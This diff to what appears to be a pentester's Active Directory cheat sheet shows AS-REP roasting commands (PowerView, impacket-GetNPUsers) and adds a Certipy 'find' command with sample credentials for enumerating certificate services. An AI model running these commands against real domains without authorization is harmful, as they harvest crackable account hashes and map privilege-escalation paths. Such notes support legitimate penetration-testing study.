@@ -26,3 +26,9 @@ Get-DomainUser -PreauthNotRequired -verbose
 impacket-GetNPUsers $domain-name/ -dc-ip $ip -usersfile usernames.txt
 ```
 
+https://github.com/ly4k/Certipy
+
+```
+certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
+```
+
